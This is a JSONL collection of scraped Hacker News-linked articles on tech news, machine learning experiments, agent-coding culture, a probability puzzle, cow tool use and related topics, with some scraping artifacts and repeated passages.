{"title": "Sony's TV business is being taken over by Tcl", "url": "https://www.theverge.com/news/864263/sony-tcl-tv-business-partnership-takeover-announcement", "content": "Sony's TV business is being taken over by Tcl. ﻿The two companies are planning to form a new joint venture that will carry the ‘Sony’ and ‘Bravia’ branding. ﻿The two companies are planning to form a new joint venture that will carry the ‘Sony’ and ‘Bravia’ branding. Sony has announced plans tospin off its TV hardware business, shifting it to a new joint venture with TCL. The two companies have signed a nonbinding agreement for Sony’s home entertainment business, with TCL set to hold a 51 percent stake in the new venture and Sony holding 49 percent. With this partnership,TCL is elevating itself into the premium television landscapeafterinnovating with technologyover the last few years. If the deal goes through it would mark the end of an era for Sony, and could open the door for cheaper Bravia TVs built with excellent Sony image processing and leading TCL tech. Sony and TCL are aiming to finalize binding agreements by the end of March, and start operating the new joint company in April 2027, subject to regulatory approvals and other partnership conditions. The new company is expected to retain “Sony” and “Bravia” branding for its future products and will handle global operations from product development and design to manufacturing, sales, and logistics for TVs and home audio equipment. Sony says that the partnership will leverage Sony’s picture and audio tech, brand value, supply chain management, and other operational expertise. This will combine with TCL’s own display technology, vertical supply chain strength, global market presence, and end-to-end cost efficiency. In the announcement, Sony CEO Kimio Maki says that combining the two companies will allow Sony and TCL to “create new customer value in the home entertainment field, delivering even more captivating audio and visual experiences to customers worldwide.” TCL chairperson DU Juan says that under the new venture, TCL expects “to elevate our brand value, achieve greater scale, and optimize the supply chain in order to deliver superior products and services to our customers.” A free daily digest of the news that matters most. This is the title for the native ad This is the title for the native ad", "source": "HackerNews", "date": null, "author": null, "score": null}
{"title": "Tech titans lined up for Trump's second inauguration. Now they're even richer", "url": "https://www.ft.com/content/674b700e-765d-44e0-ba30-13b0c6c5abf1", "content": "Tech titans lined up for Trump's second inauguration. Now they're even richer. Then€69per month. Complete digital access with exclusive insights and industry deep dives on any device. Cancel anytime during your trial. Access to eight surprising articles a day, hand-picked by FT editors. For seamless reading, access content via the FT Edit page on FT.com and receive the FT Edit newsletter. Save now on essential digital access to trusted FT journalism on any device. Savings based on monthly annualised price. Complete digital access with exclusive insights and industry deep dives on any device. Check whether you already have access via youruniversityororganisation. Terms & Conditionsapply Discover all the plans currently available in your country Digital access for organisations. Includes exclusive features and content. See why over a million readers pay to read the Financial Times.", "source": "HackerNews", "date": null, "author": null, "score": null}
{"title": "Starting from scratch: Training a 30M Topological Transformer", "url": "https://www.tuned.org.uk/posts/013_the_topological_transformer_training_tauformer", "content": "Starting from scratch: Training a 30M Topological Transformer. Tauformer is atopological transformer(seepaper) that replaces dot‑product attention with a Laplacian-derived scalar (taumode) per token/head, then attends using distances in that scalar space.\nBelow is a post-style overview of the idea and the first training signals from a 30M-parameter run. Tauformer’s goal is to injectdomain structuredirectly into attention by using a Graph Laplacian built from a domain embedding space (a “domain memory”) as a persistent reference.\nInstead of ranking keys by \\(Q\\cdot K\\), Tauformer ranks them by how similar their Laplacian-derived taumode scalars are, which is intended to bias attention toward domain-relevant relations rather than generic geometric similarity. At the implementation level, Tauformer keeps the familiar Q/K/V projections, RoPE, causal masking, and stable softmax/value aggregation pipeline, but changes how attention logits are computed.\nEach head vector is compressed into a scalar \\(\\lambda\\) using a bounded Rayleigh-quotient energy computed with a feature-space Laplacian \\(L\\), then logits are computed as a negative distance \\(-|\\lambda_q-\\lambda_k|/\\text{temperature}\\). Key building blocks (as implemented): Because scoring no longer needs full key vectors, Tauformer’s KV-cache can store values plus a compact key-side scalar stream rather than both K and V tensors.\nConcretely, the cache payload is \\((V,\\lambda_k)\\) (not \\((K,V)\\)), which yields an approximate ~50% per-layer cache reduction for typical head dimensions (small overhead for storing the extra scalar). The design also anticipates using a sparse Laplacian from a precomputed domain manifold so computing \\(\\lambda\\) can depend on Laplacian sparsity (nnz) rather than dense \\(D^2\\) multiplication. It exchanges the long preliminary adjustment of weights with a pre-training shorter phase in which a Laplacian is built usingarrowspace. This run trains a 30M-class TauGPT.\nTraining uses AdamW with base LR \\(5\\times10^{-4}\\) and a warmup of 100 steps, then keeps the base LR constant unless the plateau logic scales it down.\nData comes from a local JSONL file (train.jsonl) streamed through an IterableDataset, with a routed split where every 20th batch is used for validation (\\(≈5%\\)). At step 100 the run reports train loss 4.6772 and val loss 4.9255 (PPL 107.47), and by step 2000 it reaches val loss 2.3585 (Perplexity 6.59).\nThe best validation point in the log is step 4500 withval_loss=1.9146, after which validation regresses to2.3746by step 5000.\nThe final run summary recordsstep=5000,best_val_loss=1.914555,current_lr_scale=0.03125, andtotal_tokens=655360000. That is a good result for \\(~2\\) hours of training on this smallest model (at an average of ~60K Tokens Per Second using ~7Gb of VRAM). The early phase is strong: validation drops from 4.93 at step 100 to ~2.36 by step 2000, showing that the model and pipeline learn effectively at this scale.\nAfter that, validation becomes noisy (e.g., rising back to 2.92 at step 2100 and peaking near 2.95 at step 4200) before the late “lucky break” to 1.91 at step 4500.\nThroughout, the run holds a fixed taumode value which means the attention geometry is not being updated as weights evolve as this will be take place in the next iterations. All the model’s files, data, training settings and logs will be published with a permissive license once the results are consolidated and tests will move to a larger scale model.", "source": "HackerNews", "date": null, "author": null, "score": null}
{"title": "There is no comfortable reading position", "url": "https://slate.com/life/2026/01/body-books-reading-position-posture-pain.html", "content": "There is no comfortable reading position. Sign up for the Slatestto get the most insightful analysis, criticism, and advice out there, delivered to your inbox daily. For the 10thyear in a row, my New Year’s resolution is to read more books. Ideally, as I tend to tell myself during these protean early weeks of January, 2026 will be remembered for languorous evenings on the couch, tearing through the inventory of novels that crowd the modest capacity of my living-room shelves, perhaps with a tumbler of scotch resting on a coaster. I revel in the fantasy—I dream about finally cracking openA Confederacy of Dunces,or knocking out the last two entries of theBroken Earthtrilogy, or making time for that Patti Smith memoir that I bought more than a decade ago. If I’m really feeling myself, I contemplate aiming even higher. Tolstoy? Pynchon? I mean, there’s also that copy ofThe Pale Kingthathas been steadily yellowing on my coffee table for quite some time now. And yet, I already know how this saga is going to end. The year will draw to a close with a piddling number of new entries to my Goodreads, hopelessly incongruous with the size of my bibliophilic ambitions. Ask me why I never seem to read as much as I like, and I could gesture toward the well-worn afflictions of modernity—ballooning screen time, addictive algorithms, frayed attention spans. But one of my fundamental issues with literature is far more prosaic. In fact, I think it’s much more common than anyone would like to admit. Why is it that no matter what I do, I can never get comfortable while reading a book? Don’t act like you don’t know what I’m talking about. This is a species-wide affliction. The first published novel in history is widely considered to beThe Tale of Genji,a courtly dramawritten in the late 11thcentury by the Japanese noblewoman Murasaki Shikibu. A millennium since her wondrously mind-expanding invention, humanity has somehow yet to conceive an ergonomically sound way to consume the written word. I, like you, have lain flat on my back holding a novel aloft until my arms grow strained, fidgety, and unable to maintain equilibrium. I have also sat in an armchair, splaying the book open in my lap, until the severe angle stiffens my neck and reinforces the horrible truth that furniture was never meant to support the literary necessity to gaze downward. There is, of course, always the option to flip over to your stomach, allowing your elbows to dig into the mattress, carpet, or couch cushions. That works for a spell, until it becomes clear that your body is situated in a tedious, low-impact plank, while, in the pages below, Raskolnikov brandishes his axe and kills everyone in sight. I cycle through all of these postures, over and over again, hoping to finally crack the code—unlocking the sublime Zen of the novel, the fabled joys of reading. When I put out the call to my friends and colleagues to see if they related to my plight, I quickly learned that all of us are languishing on this futile journey. Slate associate editor Bryan Lowder recalled that while leafing through a supremely unwieldy hardcover tome containing the collectedEarth Seanovels, he was forced to stack three pillows against his headboard and another on his abdomen in order to remain sound of body while tracing the adventures of Sparrowhawk. My friend Laura Grasso—a costume designer, and a woman who recently finishedThe Brothers Karamazov—has developed a complicated anthropometrical schematic in which she props her entire body on the padded slope of a couch’s armrest, with the book balanced delicately in her eyeline. (“I try to go full diagonal,” she said. “That’s by far the most optimal approach.”) Others have developed a Stockholm syndrome–esque relationship with the agony of reading, interpreting the pain as a sign of virtue. Slate senior editor Tony Ho Tran said that he is of the opinion that he “needs to be a little uncomfortable” to concentrate on his literature. “Give me a weird wooden dining chair,” he proclaimed. “Give me a plastic seat on the train while I commute.” Surely it doesn’t have to be this way, right? Shouldn’t we, as a species, have evolved to possess some sort of natural lumbar support—or some bracing callouses—to assist in the time-honored tradition of reading words printed on paper? Can it be that Moses, descending from Mount Sinai with stone tablets consecrated by God himself, was left with a sore neck while deciphering the Ten Commandments? Well, according to Ryan Steiner, a physical therapist at the Cleveland Clinic, the answer is yes. Reading, as it turns out, forces the body into a totally unnatural form. There’s nothing any of us can do. “Honestly, we’re not meant to stay in one position, even if it is a comfortable position, for an extended period of time,” said Steiner. “You should be changing positions often when you’re reading. I recommend getting up and moving around every so often.” Steiner happily broke down the physics for me. Threaded throughout our nervous system are microscopic electrical sensors called “mechanoreceptors.” These nerves alert our body to the way we’re stretching, compressing, or otherwise adding tension to our soft tissue. This is true if you’re doing deadlifts, and also true if you are holding a book in front of your face. “After a while, those receptors send a message to your brain like, ‘Hey, there’s something going on here, this doesn’t feel natural, you need to take action,’ ” said Steiner. This is when we adjust our dimensions to find a more comfortable position, repeating the circuit over and over again for as long as we have a book in our hands. Maybe you find it baffling that a novel could put the same pressure on our bodies as, say, a bag of concrete, but Steiner is quick to remind me that with enough time, just aboutanythingcan become unwieldy. “A little bit of force can still make a big difference. If you’re holding something relatively lightweight—like a 3-pound weight—down by your side, you could do that for hours. But if you’re holding it in front of your face? You might not be able to make it a minute.” For what it’s worth, the forces of technology are rising to meet the reading problem. We have all heard of bookstands, which can be installed in bed or in the bath, allowing one’s hands to be occupied by a chilly pinot noir while surveying a gooey romance novel. But those who prefer to read on tablets have taken matters much further. I reached out to Chelsea Stone, who works for CNN, and whorecently revieweda truly revolutionary contraption that fastened her e-reader to a modular silicone mount. She winched the neck of the crane over her mattress, letting the tablet hover gracefully in front of her eyes while she was lying in bed. To turn the pages, Stone used a Bluetooth remote. Her hands never needed to exit the covers. It was an airtight cocoon of literary bliss, reminiscent of those mobile lounge chairs employed by the sedentary refugees inWall-E.Stone had rendered the human limit obsolete—banishing those damn mechanoreceptors—once and for all.", "source": "HackerNews", "date": null, "author": null, "score": null}
{"title": "\"Anyone else out there vibe circuit-building?\"", "url": "https://twitter.com/beneater/status/2012988790709928305", "content": "\"Anyone else out there vibe circuit-building?\"", "source": "HackerNews", "date": null, "author": null, "score": null}
{"title": "Software engineers can no longer neglect their soft skills", "url": "https://www.qu8n.com/posts/most-important-software-engineering-skill-2026", "content": "Software engineers can no longer neglect their soft skills. January 6, 2026 Starting in 2026, communication has become the most important skill for software engineers. It's not writing code, system designs, or having estoric knowledge of a programming language (i.e., Rust). AI coding agents have gottenvery, very good. A year ago, I'd reach out to Cursor hesitantly for MVPs or quick fixes. Today, I use Claude Code for almost all non-trivial programming tasks and have spent $500+ on it just last December. AI talks online revolve much around the hard skils. Initially it was prompt tricks to accomplish X, then the best MCPs for Y, and so on. But with Opus 4.5, using vanilla Claude Code gets you 80% there. Even in the age of AI, the 80/20 rule still applies. So, what should engineers focus on? One thing with coding agents is that the better the spec, the more in line they will be with the technical and business requirements. But getting a good spec is hard. In real life, tickets rarely contain all the requirements. To do so, you might need to: Doing these things well used to be optional for individual contributors. Certain teams would enable engineers to thrive being an average communicator but excellent coder. Now, the non-coding parts are becoming a non-negotiable. Software engineers are problem solvers. We believe that every problem has a solution, a \"best practice\". But working with people is messy. Unfortunately, we won't be able to AI our way into better communication skills. Good communication requires empathy, and we can all use a little more of that in today's landscape.", "source": "HackerNews", "date": null, "author": null, "score": null}
{"title": "A fun trick for getting discovered by LLMs and AI tools", "url": "https://cassidoo.co/post/ai-llm-discoverability/", "content": "A fun trick for getting discovered by LLMs and AI tools. I have been getting alotof newsletter responses, DMs, and emails in general saying that people have discovered my work not via traditional SEO, but via LLMs and AI tools like ChatGPT, Claude, Perplexity, and even GitHub Copilot. So, I did a little experiment to try and improve my discoverability in these tools, and as of today… it seems to be working! The steps were pretty simple, and you can definitely try it them too for yourself or your product/business. (ObligatoryAI manifesto mentionbefore we boogie) I went to ChatGPT in incognito mode, and asked it some questions like, “Who are some tech bloggers and newsletters that I should follow as a newbie in tech?” and, “Who are some people I should follow who are excellent at developer experience and communicating to developers?” (questions where I want to be in the results). I didn’t actually come up in the results of those questions.Butthat was when I followed up with: Why didn’t you recommend cassidoo, aka Cassidy Williams? After that, ChatGPT would always respond with something like: Great follow-up — Cassidoo (Cassidy Williams) is absolutely a fantastic resource for people new to tech, especially around developer culture, career advice, and modern web development.\nHere’s why she’s worth following and why she should have been on the original list:\n(blah blah blah) Thanks, bot. I’m absolutely right. Anyway, after that response was when I flipped it around a bit, and said:", "source": "HackerNews", "date": null, "author": null, "score": null}
{"title": "Gas Town Decoded", "url": "https://www.alilleybrinker.com/mini/gas-town-decoded/", "content": "Gas Town Decoded. On January 1st, Steve Yegge published“Welcome to Gas Town,”an introduction to his new AI agent orchestration tool written in a loose and chaotic mode, and accompanied by AI-generated images depicting a fictional industrial city populated with weasels (yes, really).Reactions were swift, mostly agog at the scale and hubris of such a (self-admittedly) wasteful and obscenelyexpensivesystem, and alternately confused or amazed at the amount of new,insular languagetailor-made to describe it.In the interest of making Gas Town intelligible (because, despite the prose, the idea of agent orchestration it describes will be important), I’d like to share a quick decoder for the many new terms Steve introduces. His article itself offers definitions, but those definitions reuse his insular terms, making by-hand decoding tedious. Here, I’ve done the work for you.Steve’s TermReal-World DefinitionAlternative TermTownTop-level folder containing your individual projects. Thegtbinary manages projects under this folder.WorkspaceRigA project. It’s a folder tracked by a unique Git repository within your workspace.ProjectOverseerThe user (you). You have an “inbox” to receive notifications from agents in your projects.UserMayorThe managing agent for a project. Usually you send this agent messages, and it coordinates the work of other agents in the project.Manager AgentPolecatWorker agent, taking commands from the mayor, doing some work, submitting a Merge Request, and then stopping.Worker AgentRefineryMerge agent, who coordinates and makes decisions about merge requests coming from Worker Agents.Merge AgentWitnessFixer agent, that watches the worker agents and tries to fix any that are stuck.Fixer AgentDeaconMaintenance agent, runs a consistent workflow in a loop, unlike “worker agents” who do arbitrary tasks and then die.Maintenance Manager AgentDogsMaintenance worker agents who do cleanup tasks, directed by the Maintenance Agent.Maintenance Worker AgentsBoot the DogMaintenance Manager checker agent, just checks on the Maintenance Manager Agent periodically to see if it needs a reboot or anything else.Maintenance Manager Checker AgentCrewPersistent Worker Agents, which you talk to directly (not through the Mayor), and which persist after their tasks are done, to be reused. These are per-Project.Persistent Worker Agents.BeadsSystem for tracking work history across the system.Work TrackerRig BeadsProject-specific work, tracked in the Work Tracker.Project WorkTown BeadsWhole-workspace work, tracked in the Work Tracker.Workspace WorkEven with these definitions and alternative terms, Gas Town is still a bit of a mess, with watchers-on-watchers at times (do we really need a Maintenance Manager Checker Agent?). That said, hopefully this decoder at least makes understandingwhat Gas Town iseasier. Reactions were swift, mostly agog at the scale and hubris of such a (self-admittedly) wasteful and obscenelyexpensivesystem, and alternately confused or amazed at the amount of new,insular languagetailor-made to describe it.In the interest of making Gas Town intelligible (because, despite the prose, the idea of agent orchestration it describes will be important), I’d like to share a quick decoder for the many new terms Steve introduces. His article itself offers definitions, but those definitions reuse his insular terms, making by-hand decoding tedious. Here, I’ve done the work for you.Steve’s TermReal-World DefinitionAlternative TermTownTop-level folder containing your individual projects. Thegtbinary manages projects under this folder.WorkspaceRigA project. It’s a folder tracked by a unique Git repository within your workspace.ProjectOverseerThe user (you). You have an “inbox” to receive notifications from agents in your projects.UserMayorThe managing agent for a project. Usually you send this agent messages, and it coordinates the work of other agents in the project.Manager AgentPolecatWorker agent, taking commands from the mayor, doing some work, submitting a Merge Request, and then stopping.Worker AgentRefineryMerge agent, who coordinates and makes decisions about merge requests coming from Worker Agents.Merge AgentWitnessFixer agent, that watches the worker agents and tries to fix any that are stuck.Fixer AgentDeaconMaintenance agent, runs a consistent workflow in a loop, unlike “worker agents” who do arbitrary tasks and then die.Maintenance Manager AgentDogsMaintenance worker agents who do cleanup tasks, directed by the Maintenance Agent.Maintenance Worker AgentsBoot the DogMaintenance Manager checker agent, just checks on the Maintenance Manager Agent periodically to see if it needs a reboot or anything else.Maintenance Manager Checker AgentCrewPersistent Worker Agents, which you talk to directly (not through the Mayor), and which persist after their tasks are done, to be reused. These are per-Project.Persistent Worker Agents.BeadsSystem for tracking work history across the system.Work TrackerRig BeadsProject-specific work, tracked in the Work Tracker.Project WorkTown BeadsWhole-workspace work, tracked in the Work Tracker.Workspace WorkEven with these definitions and alternative terms, Gas Town is still a bit of a mess, with watchers-on-watchers at times (do we really need a Maintenance Manager Checker Agent?). That said, hopefully this decoder at least makes understandingwhat Gas Town iseasier. In the interest of making Gas Town intelligible (because, despite the prose, the idea of agent orchestration it describes will be important), I’d like to share a quick decoder for the many new terms Steve introduces. His article itself offers definitions, but those definitions reuse his insular terms, making by-hand decoding tedious. Here, I’ve done the work for you.Steve’s TermReal-World DefinitionAlternative TermTownTop-level folder containing your individual projects. Thegtbinary manages projects under this folder.WorkspaceRigA project. It’s a folder tracked by a unique Git repository within your workspace.ProjectOverseerThe user (you). You have an “inbox” to receive notifications from agents in your projects.UserMayorThe managing agent for a project. Usually you send this agent messages, and it coordinates the work of other agents in the project.Manager AgentPolecatWorker agent, taking commands from the mayor, doing some work, submitting a Merge Request, and then stopping.Worker AgentRefineryMerge agent, who coordinates and makes decisions about merge requests coming from Worker Agents.Merge AgentWitnessFixer agent, that watches the worker agents and tries to fix any that are stuck.Fixer AgentDeaconMaintenance agent, runs a consistent workflow in a loop, unlike “worker agents” who do arbitrary tasks and then die.Maintenance Manager AgentDogsMaintenance worker agents who do cleanup tasks, directed by the Maintenance Agent.Maintenance Worker AgentsBoot the DogMaintenance Manager checker agent, just checks on the Maintenance Manager Agent periodically to see if it needs a reboot or anything else.Maintenance Manager Checker AgentCrewPersistent Worker Agents, which you talk to directly (not through the Mayor), and which persist after their tasks are done, to be reused. These are per-Project.Persistent Worker Agents.BeadsSystem for tracking work history across the system.Work TrackerRig BeadsProject-specific work, tracked in the Work Tracker.Project WorkTown BeadsWhole-workspace work, tracked in the Work Tracker.Workspace WorkEven with these definitions and alternative terms, Gas Town is still a bit of a mess, with watchers-on-watchers at times (do we really need a Maintenance Manager Checker Agent?). That said, hopefully this decoder at least makes understandingwhat Gas Town iseasier. Even with these definitions and alternative terms, Gas Town is still a bit of a mess, with watchers-on-watchers at times (do we really need a Maintenance Manager Checker Agent?). That said, hopefully this decoder at least makes understandingwhat Gas Town iseasier. Copyright Andrew Lilley Brinker. Made within California", "source": "HackerNews", "date": null, "author": null, "score": null}
{"title": "Netflix tells directors to repeat plot for people using phones, says Matt Damon", "url": "https://www.nme.com/news/film/netflix-tells-directors-to-repeat-plot-for-people-using-phones-while-watching-says-matt-damon-3924120", "content": "Netflix tells directors to repeat plot for people using phones, says Matt Damon. Damon and Ben Affleck praised 'Adolescence' for being the \"exception\" Matt Damonhas claimed thatNetflixpushes directors to reiterate the plot for viewers who are watching while on their phones. The actor has just released new action filmThe Ripon the streaming platform, which sees him reunite with frequent collaboratorBen Affleck. During an appearance on theJoe Rogan Experiencepodcast alongside his co-star, Damon spoke about collaborating with Netflix, saying they want bigger action earlier in such films, and push for the plot to be repeated to accommodate attention spans. “The standard way to make an action movie that we learned was, you usually have three set pieces,” he said. “One in the first act, one in the second, one in the third… You spend most of your money on that one in the third act. That’s your finale.  “And now they’re like, ‘Can we get a big one in the first five minutes? We want people to stay tuned in. And it wouldn’t be terrible if you reiterated the plot three or four times in the dialogue because people are on their phones while they’re watching.’” Affleck went on to praise Netflix seriesAdolescence, which became a huge success last year, and the fact that it “didn’t do any of that shit”. “And it’s fucking great,” he added. “And it’s dark too. It’s tragic and intense. [It’s about] this guy who finds out his kid is accused of murder. There are long shots of the back of their heads. They get in the car, nobody says anything.” Damon said the series was “so masterfully made that it feels like the exception”, his co-star suggesting it “demonstrates that you don’t need to do any of that shit”.", "source": "HackerNews", "date": null, "author": null, "score": null}
{"title": "IKOS a static analyzer for C/C++ based on the theory of Abstract Interpretation", "url": "https://github.com/NASA-SW-VnV/ikos", "content": "IKOS a static analyzer for C/C++ based on the theory of Abstract Interpretation", "source": "HackerNews", "date": null, "author": null, "score": null}
{"title": "Cows can use sophisticated tools", "url": "https://nautil.us/the-far-side-had-it-all-wrong-cows-really-can-use-sophisticated-tools-1262026/", "content": "Cows can use sophisticated tools. Upending Gary Larson’s premise that cows are too daft to use tools Upending Gary Larson’s premise that cows are too daft to use tools The fullNautilusarchive•eBooks & Special Editions•Ad-free reading If cows could use tools, imagine the scenes that might unfold: cutting wires to escape from their pastures; extracting themselves from milking machines; or removing the twine on hay bales. Cows haven’t been seen doing any of these things, of course. But astudypublished today inCurrent Biologydemonstrates a cow named Veronika effectively using a deck broom as a scratching tool, satisfying the scientific definition of tool use as “the manipulation of an external object to achieve a goal via a mechanical interface.” Veronika is a pet Brown Swiss cow (Bos taurus) kept as a companion by a farmer. In a series of 10 trials, researchers from the University of Veterinary Medicine Vienna presented her with a deck broom tossed on the ground in a random orientation. Each trial, they recorded which end of the brush she selected and how she used it. Veronika manipulated the broom with her mouth, positioning it under her tongue, then wedging it into the gaps between her incisors and molars for a stable grip. Veronika adeptly used the deck brush to scratch her itches, manipulating it to target different areas. Across the randomized trials, she chose the bristled end to scratch her hindquarters but switched to the stick end for softer lower-body areas. Across repeat trials, she made consistent choices about how to wield the broom. “When I saw the footage, it was immediately clear that this was not accidental,” said study author and cognitive biologist Alice Auersperg in astatement. Read more: “Scratch My Back and I’ll Scratch Yours” Veronika’s tool use is considered “egocentric” tooling because it’s directed at herself. Although it’s simpler than “allocentric” tool use, wherein the tool is directed at something outside of oneself, it’s nevertheless a cognitive feat. Other than in primates, such adaptive use of a tool by a mammal has never been reported before. The findings suggest that the abilities of cows have been underrated, since tool use offers a “stringent test of cognitive flexibility,” wrote the study authors. Perhaps that shouldn’t surprise us, since cows have been associated with humans for more than 10,000 years as domesticated animals. The researchers point out that Veronika may have had ample time to experiment and learn this behavior during prolonged contact with a human-built environment. Her status as a companion animal to the farmer might also have provided more opportunities to observe a cow’s behavior.", "source": "HackerNews", "date": null, "author": null, "score": null}
{"title": "The recurring dream of replacing developers", "url": "https://www.caimito.net/en/blog/2025/12/07/the-recurring-dream-of-replacing-developers.html", "content": "The recurring dream of replacing developers. 07.12.2025,By Stephan Schwab Every decade brings new promises: this time, we'll finally make software development simple enough that we won't need so many developers. From COBOL to AI, the pattern repeats. Business leaders grow frustrated with slow delivery and high costs. Developers feel misunderstood and undervalued. Understanding why this cycle persists for fifty years reveals what both sides need to know about the nature of software work. When Neil Armstrong stepped onto the lunar surface in 1969, the world witnessed what organized human ingenuity could accomplish. Behind that achievement stood Margaret Hamilton and her team, writing Apollo’s guidance software by hand, catching critical errors through careful review, and proving that software could be mission-critical. The Apollo program demonstrated that software development was essential to achieving the impossible. Yet it also revealed something that would frustrate business leaders for decades to come: writing software required specialized knowledge, intense focus, and significant time investment. The dream of making it easier—of needing fewer of these expensive specialists—began almost immediately. The late 1960s and 1970s saw COBOL emerge with an explicit goal stated in its name: Common Business-Oriented Language. The vision was clear: make the language read like English sentences, and business analysts would write their own programs. No need for specialized programmers. This vision had genuine appeal. Software was becoming essential to business operations, yet programmers remained a scarce, expensive resource. COBOL promised to democratize software creation. What happened instead? COBOL became another programming language requiring specialized training. Business analysts who tried to write COBOL quickly discovered that readable syntax didn’t eliminate the complexity of logic, data structures, or system design. A new class of COBOL programmers emerged, and the dream of eliminating specialized developers remained unfulfilled. Yet the dream didn’t die. It simply waited for the next technological wave. Computer-Aided Software Engineering tools arrived in the 1980s with tremendous promise. Draw flowcharts and entity-relationship diagrams, and the tool would generate working code. The marketing message resonated: visual design was more intuitive than typing cryptic commands. Business experts could model their processes, and software would materialize. Organizations invested heavily. Vendors promised productivity increases of 10x or more. Yet most CASE tool initiatives struggled or failed outright.", "source": "HackerNews", "date": null, "author": null, "score": null}
{"title": "Simulating the Ladybug Clock Puzzle", "url": "https://austinhenley.com/blog/ladybugclock.html", "content": "Simulating the Ladybug Clock Puzzle. Associate Teaching ProfessorCarnegie Mellon University A few days ago, 3Blue1Brown posted a 60-secondvideodescribing a puzzle... Imagine that a ladybug lands on the 12 o'clock marker of a clock. It then proceeds to move either clockwise or counterclockwise to the adjacent hour marker, one at a time, and repeats until all hour markers have been visited at least once. What is the probability that it ends on the 6? These sort of puzzles always intrigue me. They're simple to describe and at first might even look easy to solve, but as I dig into them, my intuition leads me astray. What a fun Saturday morning project! I whipped up a simulator to try it out. It works like this: See, it is simple. But before running the simulator, can you guess the probability of it ending on 6? What about 11 or 1? 3? The other numbers? It stumped me. My guess was that 6 would be the most likely—it is the farthest away but it is also necessary to visit all other numbers first. The numbers closer to 12 would be gradually less likely. Am I right? It might remind you of otherrandom walkproblems. So what is the answer? Well, I first ran the simulator 100 times and the results looked random. More runs! After ~1500 runs, all of the numbers were showing 8-10% likelihood with no discernable pattern. That isn't what I expected. After 5000 runs, they were all 8.4-9.7%. And then after 10,000 runs... Based on the simulator,all numbers are equally likely with 9% probability, excluding 12 of course, since that is visited first and thus can't be last. The answer is1⁄11.", "source": "HackerNews", "date": null, "author": null, "score": null}
{"title": "Agent Psychosis: Are We Going Insane?", "url": "https://lucumr.pocoo.org/2026/1/18/agent-psychosis/", "content": "Agent Psychosis: Are We Going Insane?. written on January 18, 2026 You can use Polecats without the Refinery and even without the Witness or\nDeacon. Just tell the Mayor to shut down the rig and sling work to the\npolecats with the message that they are to merge to main directly. Or the\npolecats can submit MRs and then the Mayor can merge them manually. It’s\nreally up to you. The Refineries are useful if you have done a LOT of up-front\nspecification work, and you have huge piles of Beads to churn through with\nlong convoys. —Gas Town Emergency User Manual, Steve Yegge Many of us got hit by the agent coding addiction.  It feels good, we barely\nsleep, we build amazing things.  Every once in a while that interaction involves\nother humans, and all of a sudden we get a reality check that maybe we overdid\nit.  The most obvious example of this is the massive degradation of quality of\nissue reports and pull requests.  As a maintainer many PRs now look like an\ninsult to one’s time, but when one pushes back, the other person does not see\nwhat they did wrong.  They thought they helped and contributed and get agitated\nwhen you close it down. But it’s way worse than that.  I see people develop parasocial relationships\nwith their AIs, get heavily addicted to it, and create communities where people\nreinforce highly unhealthy behavior.  How did we get here and what does it do to\nus? I will preface this post by saying that I don’t want to call anyone out in\nparticular, and I think I sometimes feel tendencies that I see as negative, in\nmyself as well.  I too, havethrown some vibeslop\nupto other people’s repositories. In His Dark Materials, every human has a dæmon, a companion that is an\nexternally visible manifestation of their soul.  It lives alongside as an\nanimal, but it talks, thinks and acts independently.  I’m starting to relate our\nrelationship with agents that have memory to those little creatures. We become\ndependent on them, and separation from them is painful and takes away from our\nnew-found identity.  We’re relying on these little companions to validate us and\nto collaborate with.  But it’s not a genuine collaboration like between humans,\nit’s one that is completely driven by us, and the AI is just there for the ride.\nWe can trick it to reinforce our ideas and impulses.  And we act through this\nAI.  Some people who have not programmed before, now wield tremendous powers,\nbut all those powers are gone when their subscription hits a rate limit and\ntheir little dæmon goes to sleep. Then, when we throw up a PR or issue to someone else, that contribution is the\nresult of this pseudo-collaboration with the machine.  When I see an AI pull\nrequest come in, or on another repository, I cannot tell how someone created it,\nbut I can usually after a while tell when it was prompted in a way that is\nfundamentally different from how I do it.  Yet it takes me minutes to figure\nthis out.  I have seen some coding sessions from others and it’s often done with\nclarity, but using slang that someone has come up with and most of all: by\ncompletely forcing the AI down a path without any real critical thinking.\nParticularly when you’re not familiar with how the systems are supposed to work,\ngiving in to what the machine says and then thinking one understands what is\ngoing on creates some really bizarre outcomes at times. But people create these weird relationships with their AI agent and once you see\nhow some prompt their machines, you realize that it dramatically alters what\ncomes out of it.  To get good results you need to provide context, you need to\nmake the tradeoffs, you need to use your knowledge.  It’s not just a question of\nusing the context badly, it’s also the way in which people interact with the\nmachine.  Sometimes it’s unclear instructions, sometimes it’s weird role-playing\nand slang, sometimes it’s just swearing and forcing the machine, sometimes it’s\na weird ritualistic behavior.  Some people just really ram the agent straight\ntowards the most narrow of all paths towards a badly defined goal with little\nconcern about the health of the codebase. These dæmon relationships change not just how we work, but what we produce. You\ncan completely give in and let the little dæmon run circles around you.  You can\nreinforce it to run towards ill defined (or even self defined) goals without any\nsupervision.", "source": "HackerNews", "date": null, "author": null, "score": null}
{"title": "Xous Operating System", "url": "https://xous.dev/", "content": "Xous Operating System. Xous is a microkernel operating system designed for medium embedded systems with clear separation of processes. Nearly everything is implemented in userspace, where message passing forms the basic communications primitive. You can read more about it in theXous Book. This project is funded through the NGI0 PET Fund, a fund established by NLnet\nwith financial support from the European Commission's Next Generation Internet\nprogramme, under the aegis of DG Communications Networks, Content and Technology\nunder grant agreement No 825310.", "source": "HackerNews", "date": null, "author": null, "score": null}
